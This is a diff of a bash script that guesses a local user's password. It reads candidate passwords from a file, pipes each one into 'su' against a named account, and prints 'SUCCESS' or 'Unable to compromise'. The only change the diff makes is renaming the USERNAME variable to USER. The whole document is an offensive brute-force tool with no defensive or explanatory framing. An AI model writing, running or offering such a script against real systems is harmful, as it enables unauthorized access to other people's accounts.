@@ -1,5 +1,5 @@
 #!/bin/bash
-USERNAME="jmartinez"
+USER="jmartinez"
 PASSWORD_FILE="passwords.txt"
 
 if [[ ! -f "${PASSWORD_FILE}" ]]; then
@@ -8,14 +8,14 @@ if [[ ! -f "${PASSWORD_FILE}" ]]; then
 fi
 
 while read -r password; do
-  echo "Attempting password: ${password} against ${USERNAME}..."
-  if echo "${password}" | timeout 0.2 su - ${USERNAME} -c 'whoami' | grep -q "${USERNAME}"; then
+  echo "Attempting password: ${password} against ${USER}..."
+  if echo "${password}" | timeout 0.2 su - ${USER} -c 'whoami' | grep -q "${USER}"; then
     echo
-    echo "SUCCESS! The password for ${USERNAME} is ${password}"
-    echo "Use su - ${USERNAME} and provide the password to switch"
+    echo "SUCCESS! The password for ${USER} is ${password}"
+    echo "Use su - ${USER} and provide the password to switch"
     exit 0
   fi
 done < "${PASSWORD_FILE}"
 
-echo "Unable to compromise ${USERNAME}."
+echo "Unable to compromise ${USER}."
 exit 1
